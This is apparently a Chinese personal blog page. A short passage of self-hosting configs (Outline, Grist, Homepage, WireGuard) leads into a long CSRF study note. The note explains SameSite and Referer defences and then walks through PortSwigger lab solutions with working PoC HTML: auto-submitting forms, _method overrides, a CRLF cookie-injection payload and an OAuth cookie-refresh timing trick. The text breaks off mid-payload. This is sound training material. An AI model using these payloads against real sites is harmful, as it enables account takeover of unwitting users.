SENTRY_TUNNEL= # 启用从 Notion 工作区导入页面 # 文档：https://docs.getoutline.com/s/hosting/doc/notion-2v6g7WY3l3 NOTION_CLIENT_ID= NOTION_CLIENT_SECRET= # Iframely 集成：支持在 Outline 中预览第三方内容（如悬停外部链接显示预览） # 文档：https://docs.getoutline.com/s/hosting/doc/iframely-HwLF1EZ9mo IFRAMELY_URL= IFRAMELY_API_KEY= # –––––––––––––––––––––––––––––––––––––– # ––––––––––– 调试配置 ––––––––––– # –––––––––––––––––––––––––––––––––––––– # 是否允许安装程序通过发送匿名统计信息检查更新 ENABLE_UPDATES=true # 要启用的调试类别，若你的代理已记录入站 HTTP 请求，可移除默认的 \u0026#34;http\u0026#34; 避免重复日志 DEBUG=http # 配置服务器日志的最低严重级别，可选值： # error, warn, info, http, verbose, debug, silly LOG_LEVEL=info grist 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 # /root/grist/docker-compose.yml services: grist: image: gristlabs/grist:latest environment: # Postgres database setup TYPEORM_DATABASE: grist TYPEORM_USERNAME: grist TYPEORM_HOST: grist-db TYPEORM_LOGGING: false TYPEORM_PASSWORD: ${DATABASE_PASSWORD} TYPEORM_PORT: 5432 TYPEORM_TYPE: postgres # OIDC核心配置 GRIST_OIDC_IDP_ISSUER: \u0026#34;https://auth.yulinsec.cn/application/o/grist/.well-known/openid-configuration\u0026#34; # 替换为Authentik中Grist应用的Client ID GRIST_OIDC_IDP_CLIENT_ID: \u0026#34;...\u0026#34; # 替换为Authentik中Grist应用的Client Secret GRIST_OIDC_IDP_CLIENT_SECRET: \u0026#34;...\u0026#34; # Grist的外部访问地址（需与Authentik的Redirect URI一致） GRIST_OIDC_SP_HOST: \u0026#34;https://grist.yulinsec.cn\u0026#34; # 可选：请求的OIDC Scope（默认openid email profile） GRIST_OIDC_IDP_SCOPES: \u0026#34;openid email profile\u0026#34; # 可选：登出时跳过IDP的注销端点（若Authentik不支持RP-Initiated Logout） # GRIST_OIDC_IDP_SKIP_END_SESSION_ENDPOINT: \u0026#34;true\u0026#34; # 可选：用户名称/邮箱的属性映射（默认自动取name/email） GRIST_OIDC_SP_PROFILE_NAME_ATTR: \u0026#34;name\u0026#34; GRIST_OIDC_SP_PROFILE_EMAIL_ATTR: \u0026#34;email\u0026#34; GRIST_OIDC_SP_IGNORE_EMAIL_VERIFIED: true # Redis setup REDIS_URL: redis://grist-redis # MinIO setup. This requires the bucket set up on the MinIO instance with versioning enabled. GRIST_DOCS_MINIO_ACCESS_KEY: grist GRIST_DOCS_MINIO_SECRET_KEY: ${MINIO_PASSWORD} GRIST_DOCS_MINIO_USE_SSL: 0 GRIST_DOCS_MINIO_BUCKET: grist-docs GRIST_DOCS_MINIO_ENDPOINT: grist-minio GRIST_DOCS_MINIO_PORT: 9000 # 新增核心配置 GRIST_HOME_URL: ${GRIST_EXTERNAL_URL} # 外部访问地址，OIDC回调依赖 GRIST_SINGLE_ORG: \u0026#34;YulinSec\u0026#34; # 单组织名称，自定义 GRIST_PORT: 8484 # 容器内端口（固定） NODE_ENV: production # 生产环境 volumes: # Where to store persistent data, such as documents. - ${PERSIST_DIR}/grist:/persist ports: - 8484:8484 depends_on: - grist-db - grist-redis - grist-minio - minio-setup grist-db: image: postgres:alpine environment: POSTGRES_DB: grist POSTGRES_USER: grist POSTGRES_PASSWORD: ${DATABASE_PASSWORD} volumes: - ${PERSIST_DIR}/postgres:/var/lib/postgresql/data grist-redis: image: redis:alpine volumes: - ${PERSIST_DIR}/redis:/data grist-minio: image: minio/minio:latest environment: MINIO_ROOT_USER: grist MINIO_ROOT_PASSWORD: ${MINIO_PASSWORD} volumes: - ${PERSIST_DIR}/minio:/data command: server /data --console-address=\u0026#34;:9001\u0026#34; # This sets up the buckets required in MinIO. It is only needed to make this example work. # It isn\u0026#39;t necessary for deployment and can be safely removed. minio-setup: image: minio/mc environment: MINIO_PASSWORD: ${MINIO_PASSWORD} depends_on: grist-minio: condition: service_started restart: on-failure entrypoint: \u0026gt; /bin/sh -c \u0026#34; /usr/bin/mc alias set myminio http://grist-minio:9000 grist \u0026#39;$MINIO_PASSWORD\u0026#39;; /usr/bin/mc mb myminio/grist-docs; /usr/bin/mc anonymous set public myminio/grist-docs; /usr/bin/mc version enable myminio/grist-docs; \u0026#34; 1 2 3 4 5 6 7 8 9 # /root/grist/.env # 数据库密码 DATABASE_PASSWORD=... # MinIO根密码（需8位以上） MINIO_PASSWORD=... # 持久化数据目录（宿主机路径） PERSIST_DIR=/root/grist/data # Grist外部访问地址（核心：OIDC回调依赖此地址） GRIST_EXTERNAL_URL=https://grist.yulinsec.cn todo:同步脚本\nhomepage 1 2 3 4 5 6 7 8 9 10 11 12 # /root/homepage services: homepage: image: ghcr.io/gethomepage/homepage:latest container_name: homepage ports: - 3000:3000 volumes: - /path/to/config:/app/config # Make sure your local config directory exists - /var/run/docker.sock:/var/run/docker.sock # (optional) For docker integrations environment: HOMEPAGE_ALLOWED_HOSTS: gethomepage.dev # required, may need port. See gethomepage.dev/installation/#homepage_allowed_hosts WireGuard 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 volumes: etc_wireguard: services: wg-easy: #environment: # Optional: # - PORT=51821 # - HOST=0.0.0.0 # - INSECURE=false image: ghcr.io/wg-easy/wg-easy:15 container_name: wg-easy networks: wg: ipv4_address: 10.42.42.42 ipv6_address: fdcc:ad94:bacf:61a3::2a volumes: - etc_wireguard:/etc/wireguard - /lib/modules:/lib/modules:ro ports: - \u0026#34;51820:51820/udp\u0026#34; - \u0026#34;51821:51821/tcp\u0026#34; restart: unless-stopped cap_add: - NET_ADMIN - SYS_MODULE # - NET_RAW # ⚠️ Uncomment if using Podman sysctls: - net.ipv4.ip_forward=1 - net.ipv4.conf.all.src_valid_mark=1 - net.ipv6.conf.all.disable_ipv6=0 - net.ipv6.conf.all.forwarding=1 - net.ipv6.conf.default.forwarding=1 networks: wg: driver: bridge enable_ipv6: true ipam: driver: default config: - subnet: 10.42.42.0/24 - subnet: fdcc:ad94:bacf:61a3::/64 ","date":"2025-11-23T00:00:00Z","permalink":"https://calendar0917.github.io/posts/devops-%E5%BE%A1%E6%9E%97%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE/","title":"御林服务配置合集"},{"content":"知识 原理 跨站请求伪造（Cross-site request forgery）是一种漏洞，攻击者可通过该漏洞诱导用户执行非本意的操作。它能让攻击者部分绕过 “同源策略”—— 该策略的设计初衷本是防止不同网站之间相互干扰。\n成功的 CSRF 攻击会诱导受害用户执行非本意的操作。例如，修改账户绑定邮箱、更改密码或进行资金转账等。根据操作的性质不同，攻击者可能完全掌控用户账户。若被攻陷的用户在应用中拥有特权角色（如管理员），攻击者则可能全面控制应用的所有数据与功能。\nCSRF攻击的实施需满足三个核心前提，攻击者通过构造恶意页面诱导用户触发请求，利用浏览器自动携带的用户凭证完成攻击，具体原理如下：\n前提：\n存在有价值的目标操作：应用中存在攻击者值得诱导的操作，可能是特权操作（如修改其他用户权限），也可能是用户专属数据操作（如修改自身密码、绑定邮箱）。 基于Cookie的会话验证：执行该操作的HTTP请求，仅依赖会话Cookie识别用户身份，无其他会话跟踪或请求验证机制（如无CSRF令牌）。 请求参数可预测：触发操作的请求中，所有参数值均为攻击者可确定或猜测的内容（例如修改密码时无需知道原密码，仅需提交新密码参数）。 示例 假设某应用的“修改邮箱”功能存在CSRF漏洞，用户执行修改操作时发送的HTTP请求如下：\n1 2 3 4 5 6 7 POST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 30 Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE email=wiener@normal-user.com 该请求满足上述三大前提：修改邮箱是高价值操作（可后续重置密码劫持账户）、仅通过sessionCookie验证身份、email参数值可由攻击者任意指定。\n攻击者创建包含自动提交表单的HTML页面，核心代码如下：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://vulnerable-website.com/email/change\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;pwned@evil-user.net\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit(); // 页面加载后自动提交表单 \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 攻击者诱导受害用户访问该恶意页面（如通过邮件、社交链接发送）； 若用户已登录目标应用，浏览器会自动在请求中携带其sessionCookie（未启用SameSite Cookie策略时）； 恶意页面自动向目标应用发送“修改邮箱”的POST请求，参数为攻击者指定的邮箱（pwned@evil-user.net）； 目标应用通过Cookie识别用户身份，将该请求视为受害用户的合法操作，执行邮箱修改。 CSRF攻击并非仅局限于Cookie-based会话验证，只要应用会自动在请求中添加用户凭证（如HTTP基本认证、基于证书的认证），均可能出现CSRF漏洞。\n攻击构造 手动创建CSRF漏洞利用所需的HTML代码较为繁琐，尤其是当目标请求包含大量参数或存在其他特殊格式要求时。构造CSRF利用代码最简单的方式，是使用Burp Suite Professional内置的CSRF PoC生成器，操作步骤如下：\n在Burp Suite Professional中，选中任意你想要测试或利用的请求； 右键点击该请求，在上下文菜单中选择「Engagement tools（渗透测试工具）」→「Generate CSRF PoC（生成CSRF验证代码）」； Burp Suite会自动生成一段HTML代码，这段代码可触发选中的请求（不包含Cookie——受害用户的浏览器会自动添加Cookie）； 你可以在CSRF PoC生成器中调整各类选项，对攻击细节进行优化。部分特殊场景下（如请求存在特殊格式要求），可能需要通过这些选项适配请求特性； 将生成的HTML代码复制到一个网页中，在已登录目标漏洞网站的浏览器中打开该网页，验证目标请求是否成功发起，且预期操作是否执行。 触发方式 CSRF攻击的交付机制与反射型XSS基本一致，核心是让受害用户触发恶意请求，具体方式如下：\n一、常规交付方式（依赖外部网站）\n攻击者将恶意HTML代码部署到自己控制的网站； 通过邮件、社交媒体消息等方式，向受害用户发送该网站的链接，诱导其访问； 若恶意代码被植入热门网站（如用户评论区），攻击者无需主动诱导，只需等待用户自然访问该网站即可触发攻击。 二、简化交付方式（无需外部网站，GET请求场景）\n部分简单的CSRF漏洞可通过GET方法触发，此时攻击可被封装为漏洞网站的单个URL，无需依赖外部站点：\n攻击者直接构造恶意URL，将攻击参数嵌入查询字符串； 诱导用户访问该恶意URL，浏览器会自动发送GET请求触发攻击； 示例：若“修改邮箱”功能支持GET请求，攻击URL可直接封装为图片标签（用户访问含该标签的页面即触发）： 1 \u0026lt;img src=\u0026#34;https://vulnerable-website.com/email/change?email=pwned@evil-user.net\u0026#34;\u0026gt; 防御手段 如今，发现并利用CSRF漏洞往往需要绕过目标网站、受害浏览器或两者均部署的反CSRF机制。以下是最常见的防护手段：\n1. CSRF令牌（CSRF Tokens）\n核心机制：服务器端生成唯一、保密且不可预测的令牌，并传递给客户端； 防护逻辑：客户端执行敏感操作（如提交表单）时，必须在请求中包含正确的CSRF令牌； 防护效果：攻击者无法知晓合法令牌值，难以构造有效的恶意请求，防护效果显著。 1 2 3 4 5 6 7 常见的隐含 CSRF 令牌的方式 \u0026lt;form name=\u0026#34;change-email-form\u0026#34; action=\u0026#34;/my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;label\u0026gt;Email\u0026lt;/label\u0026gt; \u0026lt;input required type=\u0026#34;email\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;example@normal-website.com\u0026#34;\u0026gt; \u0026lt;input required type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf\u0026#34; value=\u0026#34;50FaWgdOhi9M9wyna8taR1k3ODOR8d6u\u0026#34;\u0026gt; \u0026lt;button class=\u0026#39;button\u0026#39; type=\u0026#39;submit\u0026#39;\u0026gt; Update email \u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; 2. SameSite Cookie\n核心机制：浏览器的安全机制，用于决定网站Cookie是否在跨站请求中携带； 防护逻辑：敏感操作通常需要携带已认证的会话Cookie，合适的SameSite限制可阻止跨站请求携带该Cookie； 浏览器默认行为：2021年起Chrome浏览器默认强制执行Lax级别的SameSite限制，该标准后续有望被其他主流浏览器采纳。 3. 基于Referer的验证\n核心机制：部分应用利用HTTP Referer请求头防御CSRF，验证请求是否来自应用自身域名； 防护效果：整体有效性低于CSRF令牌验证，易被绕过（如Referer可被篡改或隐藏）。 Samesite防御 判断两个 URL 是否属于同一源（origin）站，需满足三个 “完全一致”：\n协议（scheme）相同（如均为 HTTP 或 HTTPS）；\n域名（domain name）相同；\n端口（port）相同（注：端口通常可由协议推导，如 HTTP 默认 80 端口、HTTPS 默认 443 端口）。\nStrict 若 Cookie 设置了SameSite=Strict属性，浏览器不会在任何跨站请求中携带该 Cookie。简单来说，只要请求的目标网站与浏览器地址栏中当前显示的网站不一致，浏览器就不会包含该 Cookie。\n这种模式推荐用于具备数据修改权限或执行其他敏感操作的 Cookie（例如，用于访问仅认证用户可进入的特定页面的 Cookie）。\n尽管这是安全性最高的选项，但在需要跨站功能的场景中，可能会对用户体验产生负面影响（例如跨站登录、第三方平台嵌入功能会因 Cookie 无法携带而失效）。\nLax Lax 级别的 SameSite 限制意味着，浏览器仅在同时满足以下两个条件时，才会在跨站请求中携带该 Cookie：\n请求使用 GET 方法； 请求由用户的顶层导航触发（例如点击链接跳转页面）。 这意味着：\n跨站 POST 请求不会携带该 Cookie（按最佳实践，POST 请求通常用于执行数据修改或状态变更操作，是 CSRF 攻击的主要目标）； 后台请求（如脚本发起的 AJAX 请求、iframe 嵌入请求、图片等资源引用请求）也不会携带该 Cookie。 Lax 模式平衡了安全性与用户体验：既通过阻断高风险跨站请求（POST、后台请求）的 Cookie 携带，抵御大部分 CSRF 攻击；又允许正常的跨站 GET 导航（如点击第三方网站的链接跳转到目标网站）携带 Cookie，保障跨站访问的可用性（例如用户从博客链接跳转至电商网站时，仍能保持登录状态）\nNone 若Cookie设置了SameSite=None属性，则完全禁用SameSite限制（不受浏览器类型影响）。因此，浏览器会在所有指向该Cookie所属网站的请求中携带该Cookie——即便请求是由完全无关的第三方网站触发的。\n除Chrome浏览器外，其他主流浏览器在设置Cookie时若未显式指定SameSite属性，默认行为等同于SameSite=None（但目前Chrome已默认采用Lax模式，该差异需开发者重点关注）。\n存在合理的场景需要禁用SameSite限制，例如：Cookie本身用于第三方上下文（如跨站嵌入的功能、第三方统计），且不授予持有者访问任何敏感数据或功能的权限。典型示例为跟踪Cookie（用于用户行为分析、广告投放等场景）。\nSecure属性强制要求：现代浏览器（如Chrome 80+、Firefox 79+）规定，设置SameSite=None的Cookie必须同时添加Secure属性（仅在HTTPS请求中携带），否则Cookie会被浏览器拒绝。示例：\n1 Set-Cookie: tracking-id=abc123; SameSite=None; Secure 攻击手段 CSRF 看 Lab\nSamesite get 绕过 Lax 利用 get 请求\n实际场景中，服务器并非总会严格校验特定接口接收的是GET还是POST请求——即便是预期接收表单提交的接口也不例外。如果服务器为会话Cookie设置了Lax限制（无论是显式配置，还是因浏览器默认策略生效），攻击者仍可诱导受害者浏览器发起GET请求，实施CSRF攻击。\n只要该请求触发了顶层导航，浏览器就会携带受害者的会话Cookie。以下是发起此类攻击最简单的方法之一：\n1 2 3 \u0026lt;script\u0026gt; document.location = \u0026#39;https://vulnerable-website.com/account/transfer-payment?recipient=hacker\u0026amp;amount=1000000\u0026#39;; \u0026lt;/script\u0026gt; document.location会触发浏览器地址栏的页面跳转（顶层导航），符合SameSite Lax允许携带Cookie的条件，这是绕过的核心前提\n即便普通GET请求被服务器拒绝，部分框架也提供了覆盖请求行中指定方法的手段。例如，Symfony框架支持在表单中使用_method参数，该参数会优先于常规请求方法，作为路由匹配的依据：\n1 2 3 4 5 \u0026lt;form action=\u0026#34;https://vulnerable-website.com/account/transfer-payment\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;_method\u0026#34; value=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;recipient\u0026#34; value=\u0026#34;hacker\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;amount\u0026#34; value=\u0026#34;1000000\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 其他框架也提供了各类类似的参数，可实现相同的请求方法覆盖效果。\n重定向绕过 Strict 如果 Cookie 设置了 SameSite=Strict 属性，浏览器将不会在任何跨站请求（cross-site requests） 中携带该 Cookie。但如果你能找到一个攻击载体（gadget），使其触发同站点内的二次请求（secondary request），则可能绕过这一限制。\n一种可行的攻击载体是客户端重定向（client-side redirect） —— 它利用攻击者可控的输入（如 URL 参数）动态构造重定向目标。相关示例可参考我们关于基于 DOM 的开放重定向（DOM-based open redirection） 的资料。\n在浏览器看来，这类客户端重定向并非真正意义上的 “重定向”：最终发起的请求会被视为普通的独立请求（ordinary, standalone request）。关键在于，该请求属于同站点请求（same-site request），因此会携带与该站点相关的所有 Cookie，不受任何 SameSite 限制的影响。\n若你能操控此攻击载体触发恶意的二次请求，即可完全绕过（bypass completely） 所有 SameSite Cookie 限制。\n需注意：服务器端重定向（server-side redirects） 无法实现此类攻击。因为在这种情况下，浏览器会识别出 “跟随重定向的请求” 最初源自跨站请求，因此仍会执行相应的 Cookie 限制策略。\n新颁发 Cookie 绕过 Strict 设置了SameSite Lax限制的Cookie，通常不会在任何跨站POST请求中被发送，但存在一些例外情况。\n如前所述，若网站在设置Cookie时未添加SameSite属性，Chrome浏览器会默认自动应用Lax限制。不过，为避免破坏单点登录（SSO）机制，Chrome在顶级POST请求的前120秒内，并不会实际强制执行该限制。这就导致出现了一个两分钟的窗口期，在此期间用户可能会遭受跨站攻击。\n[!NOTE]\n这个两分钟的窗口期不适用于那些被显式设置了SameSite=Lax属性的Cookie。\n试图精准把控攻击时机，使其落在这个短暂的窗口期内，在实操中多少有些不切实际。但另一方面，如果你能在目标站点找到一个攻击载体，迫使受害者的浏览器被颁发一个新的会话Cookie，就可以在发起主攻击前，抢先刷新受害者的Cookie。例如，完成一次基于OAuth的登录流程时，每次都可能生成新的会话——因为OAuth服务并不一定会知晓用户是否仍在目标站点保持登录状态。\n若想让受害者无需手动重新登录就能触发Cookie刷新，你需要借助顶级导航，这能确保与用户当前OAuth会话相关的Cookie被携带。但这又带来了一个额外的挑战：你需要将用户重定向回你的站点，才能发起跨站请求伪造（CSRF）攻击。\n顶级导航：指直接在浏览器地址栏发起、或通过顶级导航（如页面跳转）触发的POST请求，区别于嵌套在iframe中的跨站POST请求，Chrome对其有120秒的Lax限制豁免期\n此外，你也可以在新标签页中触发Cookie刷新，这样浏览器就不会在你发起最终攻击前离开当前页面。这种方法存在一个小问题：浏览器会阻止弹窗标签页，除非它们是通过用户的手动交互打开的。例如，以下弹窗代码默认会被浏览器拦截：\n1 window.open(\u0026#39;https://vulnerable-website.com/login/sso\u0026#39;); 要绕过这一限制，你可以将该语句封装在点击事件处理器中，代码如下：\n1 2 3 window.onclick = () =\u0026gt; { window.open(\u0026#39;https://vulnerable-website.com/login/sso\u0026#39;); } 通过这种方式，只有当用户在页面的某个位置点击时，window.open()方法才会被调用。\n绕过 Referer 除了采用 CSRF 令牌（CSRF tokens）的防御方式外，部分应用还会利用 HTTP Referer 头（HTTP Referer header） 抵御 CSRF 攻击 —— 其核心逻辑通常是验证请求是否源自应用自身的域名。但这种防御方式的有效性普遍较低，且常常存在可被绕过的漏洞。\nHTTP Referer 头（HTTP 规范中存在拼写疏漏，正确英文应为 “Referrer”）是一个可选请求头，其内容为 “链接到当前请求资源的网页 URL”。当用户触发 HTTP 请求时（例如点击链接、提交表单），浏览器通常会自动添加该请求头。\n目前存在多种方法可让 “发起请求的源页面”隐藏或修改 Referer 头的值，这类操作通常是出于隐私保护的目的（例如防止目标站点获取用户的访问来源）。\n空白绕过 部分应用程序的处理逻辑是：当请求中携带Referer头时，才会对其进行校验；若该请求头被省略，则直接跳过校验。\n在这种情况下，攻击者可以构造特殊的CSRF利用页面，使受害者的浏览器在发送请求时丢弃Referer头。实现该效果的方法有多种，其中最简便的是在承载CSRF攻击的HTML页面中，添加一个META标签：\n1 \u0026lt;meta name=\u0026#34;referrer\u0026#34; content=\u0026#34;never\u0026#34;\u0026gt; 弱检测 部分应用程序对 Referer 头的校验方式十分简陋，这种校验机制很容易被绕过。例如，若应用仅校验 Referer 中的域名是否以预期值开头，攻击者便可将目标域名设置为自身域名的子域名：\n1 http://vulnerable-website.com.attacker-website.com/csrf-attack 同理，若应用只是简单校验 Referer是否包含自身域名，攻击者只需将目标域名嵌入 URL 的其他位置即可，比如：\n1 http://attacker-website.com/csrf-attack?vulnerable-website.com 注意尽管你可以通过 Burp 工具发现应用的这种校验行为，但在浏览器中测试对应的概念验证（PoC）代码时，往往会发现这种方法失效。为了降低敏感数据通过 Referer 头泄露的风险，如今许多浏览器默认会从 Referer 头中剥离查询字符串。\n你可以通过以下方式覆盖这一浏览器行为：确保承载攻击利用代码的响应中，设置了Referrer-Policy: unsafe-url响应头（需注意：此处的Referrer拼写是正确的 —— 这一细节正是为了检验你是否在认真关注！）。该设置能保证浏览器发送完整的 URL，其中包含查询字符串部分。\nLabs 无 waf 1.攻击点：抓到更改邮箱的包\n1 2 3 4 5 6 POST /my-account/change-email HTTP/2 Host: 0adb00ec04977937805ab22d00ce00dd.web-security-academy.net Cookie: session=zO38aClXpZPBEVpQ5KWLRyKX8dfvZ8ZR ...... email=111%40qq.com 2.攻击：生成 poc 以后，记得勾选自动提交，copy 下 html 以后发送给受害者就可以了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;html\u0026gt; \u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://0adb00ec04977937805ab22d00ce00dd.web-security-academy.net/my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;111\u0026amp;#64;qq\u0026amp;#46;com\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit request\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; history.pushState(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;/\u0026#39;); document.forms[0].submit(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 绕过 CSRF 令牌 漏查 GET 1.攻击点：抓更新邮箱的包，发现包含 CSRF 令牌，更改令牌后，请求被拒绝。但是更改请求方式为 Get 以后，又被接受了。\n2.攻击：同上，差异在于 \u0026lt;form\u0026gt; 标签里的 method，这里没指定的话就是默认 get\n漏查无令牌情况 1.攻击点同上\n2.攻击：字面意思，就是忘记检查不带 csrf 令牌的情况了，直接删掉就行。\n漏查令牌所有者 1.攻击点同上\n2.攻击：字面意思，有一个有效令牌就行了，不管是谁的。\n[!NOTE]\ncsrf 令牌只能使用一次！所以得用新的来生成注入代码\n令牌只与 Cookie 绑定 1.攻击点：\n1 2 3 4 5 6 7 POST /my-account/change-email HTTP/2 Host: 0a3400ce0428f9d280a203d800fc0048.web-security-academy.net Cookie: csrfKey=ggJi08btS3rz50WL91sxEL0mMopaNN4z; session=gi9Vh11li133YzoXHVZmM0ON8aIzGsWR ...... Priority: u=0, i email=111%40qq.com\u0026amp;csrf=7LS37jBoGngLRkbjg8qCmj6TlrhUO05Z 发现既有 csrf 又有 csrfKey\n2.测试：首先需要验证（两个账号测试），csrf 令牌只与 csrfKey 绑定（而非用户 session），这就给了攻击的可能。我们要做的就是更改用户的 Cookie 以及更改用户的令牌。\n3.攻击：替换 Cookie 需要用到 script，/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None，要让受害者访问这个链接，然后配合自己的令牌发包。\n即如下代码对/r/n url 编码了\n1 2 /?search=test Set-Cookie: csrfKey=YOUR-KEY; SameSite=None 4.payload：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;html\u0026gt; \u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://0a5600ef0353c473804a2671006200c0.web-security-academy.net/my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;11111\u0026amp;#64;qq\u0026amp;#46;com\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf\u0026#34; value=\u0026#34;9TNd8PU7ffxDiebZmAYuVMVsa7eaJAGt\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit request\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;img src=\u0026#34;https://0a5600ef0353c473804a2671006200c0.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=sPnN91GwgoWYmf7aLfqYoBRNSXZPuDTn%3b%20SameSite=None\u0026#34; onerror=\u0026#34;document.forms[0].submit()\u0026#34;\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 将原本的 script 改成了 img 标签，直接触发\nsrc的本质是发起 HTTP 请求：当受害者的浏览器加载这个\u0026lt;img\u0026gt;标签时，会自动向src中的 URL 发送 GET 请求 —— 这个 URL 就是实验中存在响应头注入漏洞的搜索功能。 URL 中的%0d%0a实现响应头注入：搜索功能会把search参数的内容反射到响应头中，而%0d%0a是 HTTP 的回车 + 换行符，会让服务器的响应头被 “拆分”，插入攻击者自定义的Set-Cookie头。 onerror的触发条件：\u0026lt;img\u0026gt;标签的src指向的是一个搜索请求的 URL，而非真正的图片资源，服务器返回的响应不是图片格式，因此\u0026lt;img\u0026gt;会加载失败，触发onerror事件,能确保Cookie 已经注入完成，再提交表单。 document.forms[0].submit()的作用：触发页面中第一个表单的自动提交 —— 这个表单就是攻击者构造的 “修改邮箱” 的 CSRF 表单（包含攻击者自己的 CSRF 令牌）。 令牌在 Cookie 复用 1.攻击点同上，这里发现了 Cookie 中也出现了 csrf，考虑可能后端只检验了两个 csrf 是否相同\n2.攻击：和上一题一样，只需将 Cookie 中的 csrf 改为与表单中提交的 csrf 一样即可。\n绕过 Samesite Lax Get + _method 绕过 1.攻击点：抓更改邮箱的包，发现并没有明显的限制，无 csrf，也无 samesite 限制，那么就是默认的 Lax 限制，考虑用 Get 绕过\n2.测试：直接用 Get 发包，提示只能用 post 方法，于是考虑用 _method=post 来欺骗服务器，将 Get 方法识别为 post\nGET /my-account/change-email?email=foo%40web-security-academy.net\u0026amp;_method=POST HTTP/1.1 成功绕过 post 检测\n3.payload:\n1 2 3 4 5 6 7 8 \u0026lt;html\u0026gt; \u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; document.location = \u0026#34;https://0af90060032691628069032c00d40060.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net\u0026amp;_method=POST\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 利用新颁发 Cookie 绕过 Oauth 1.攻击点：抓更改邮箱的包，发现没有明显限制。登录过程中，发现需要重定向到 Oauth，并且没有显式指定 Samesite，而且登录时会重新 set 一个 Cookie，所以可以考虑用重定向 + Oauth窗口期来绕过。\n2.测试：如果访问更改邮箱地址的时间与登录时间相隔超过 120s，就会更改成功，否则就会重定向到登录界面。所以思路就是，让用户先重定向到登录从而得到新 Cookie 并且外带，然后再提交更改邮箱的请求。\n3.攻击：利用函数搭配延迟触发\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;form method=\u0026#34;POST\u0026#34; action=\u0026#34;https://0a19004c04cb844080140371008500dc.web-security-academy.net/my-account/change-email\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;pwned@web-security-academy.net\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; window.onclick = () =\u0026gt; { window.open(\u0026#39;https://0a19004c04cb844080140371008500dc.web-security-academy.net/social-login\u0026#39;); setTimeout(changeEmail, 5000); } function changeEmail(){ document.forms[0].submit(); } \u0026lt;/script\u0026gt; Strict 重定向绕过 1.攻击点：抓更新邮箱的包，没有特殊限制，抓登录的包，发现 Samesite = Strict，故需要考虑绕过。\n2.测试：在主页的发送 post 中，发现在发送评论后，会跳转到确认页面，然后重定向到原来的 post，要怎么利用呢？如果我从确认页跳转到更改邮箱的页面，就可以携带用户的 Cookie 了！\n3.攻击：需要搭配路径穿越，重定向到指定网站。如下构造：\n1 2 3 4 5 6 7 8 \u0026lt;html\u0026gt; \u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; document.location = 